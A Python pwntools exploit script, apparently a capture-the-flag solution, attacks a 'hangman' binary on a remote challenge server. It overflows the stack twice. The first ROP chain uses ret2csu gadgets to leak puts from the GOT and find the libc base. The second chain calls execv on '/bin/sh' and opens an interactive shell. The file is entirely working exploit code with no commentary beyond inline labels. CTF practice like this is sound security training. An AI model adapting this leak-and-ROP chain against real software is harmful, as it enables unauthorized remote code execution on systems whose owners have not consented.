#!/usr/bin/env python3
from pwn import *
import struct
import sys

GUESS_WORD_CHOICE = b'2'

if len(sys.argv) != 2 or sys.argv[1] != "remote":
    # Local (own libc-2.30.so on Ubuntu 19.10)
    p = process("./hangman")
    gdb.attach(p)
    puts_libc_offset = 0x87490
    binsh_libc_offset = 0x1B6613
    pop_rdi_ret_offset = 0x26bb2
    pop_rsi_ret_offset = 0x2709c
    execv_libc_offset = 0xE6170 
else:
    p = remote("challenges1.hexionteam.com", 3000)
    puts_libc_offset = 0x809C0
    binsh_libc_offset = 0x1B3E9A
    pop_rdi_ret_offset = 0x2155f
    pop_rsi_ret_offset = 0x23e6a
    execv_libc_offset = 0xE4FA0

# Gadgets
dummy = 0xdeadbeef
pop_rbx_rbp_r12_r13_r14_r15_retn_gadget = 0x40199A
mov_rdx_r14_mov_rsi_r13_mov_edi_r12d_call_r15_rbx_8_gadget = 0x401980
printf_got_entry = 0x404040
puts_got_entry = 0x404028
flag_string_addr = 0x40232C
_start_addr = 0x401160


##############
# Session #1 #
##############

## Generate ROP chain
rop_chain = b''

# Initial overflow
rop_chain += p64(dummy) * 7         # Padding
rop_chain += p64(dummy)             # rbp
rop_chain += p64(pop_rbx_rbp_r12_r13_r14_r15_retn_gadget)   # rip

# 
rop_chain += p64(0)                 # rbx - should be 0
rop_chain += p64(1)                    # rbp - should be 1 (rbx + 1)
rop_chain += p64(puts_got_entry)  # r12 -> edi (only 32-bit)
rop_chain += p64(dummy)             # r13 -> rsi
rop_chain += p64(dummy)             # r14 -> rdx
rop_chain += p64(puts_got_entry)    # r15 -> rip
rop_chain += p64(mov_rdx_r14_mov_rsi_r13_mov_edi_r12d_call_r15_rbx_8_gadget)    # rip

# 
rop_chain += p64(dummy)             # Padding
rop_chain += p64(dummy)             # rbx
rop_chain += p64(dummy)             # rbp
rop_chain += p64(dummy)             # r12
rop_chain += p64(dummy)             # r13
rop_chain += p64(dummy)             # r14
rop_chain += p64(dummy)             # r15
rop_chain += p64(_start_addr)       # rip

print(f"ROP chain length: {len(rop_chain)}")

# Skip prompt
p.recvuntil("Enter choice: ")

# Trigger the overflow first time, to extend the overflow
p.sendline(GUESS_WORD_CHOICE)
p.sendline('\xff' * 38)

# Overflow the stack
p.recvuntil("Enter choice: ")
p.sendline(GUESS_WORD_CHOICE)
p.sendline(rop_chain)

# Extract libc base leak (assuming 6 byte address)
data = p.recvuntil("Good Luck!")
addr_last_byte_index = data.find(b"\x7f")
leak_addr_bytes = data[addr_last_byte_index - 5 : addr_last_byte_index + 1] + b'\x00\x00'
leak_addr = struct.unpack("<Q", leak_addr_bytes)[0]
libc_base = leak_addr - puts_libc_offset
print(f"libc_base: {hex(libc_base)}")

##############
# Session #2 #
##############

## Generate second ROP chain
second_rop_chain = b''

# Initial overflow
second_rop_chain += p64(dummy) * 7         # Padding
second_rop_chain += p64(dummy)             # rbp
second_rop_chain += p64(libc_base + pop_rdi_ret_offset) # rip

second_rop_chain += p64(libc_base + binsh_libc_offset)  # rdi
second_rop_chain += p64(libc_base + pop_rsi_ret_offset) # rip

second_rop_chain += p64(0)                              # rsi
second_rop_chain += p64(libc_base + execv_libc_offset)  # rip

# Skip prompt
p.recvuntil("Enter choice: ")

# Trigger the overflow first time, to extend the overflow
p.sendline(GUESS_WORD_CHOICE)
p.sendline('\xff' * 38)

# Overflow the stack
p.recvuntil("Enter choice: ")
p.sendline(GUESS_WORD_CHOICE)
p.sendline(second_rop_chain)

p.interactive()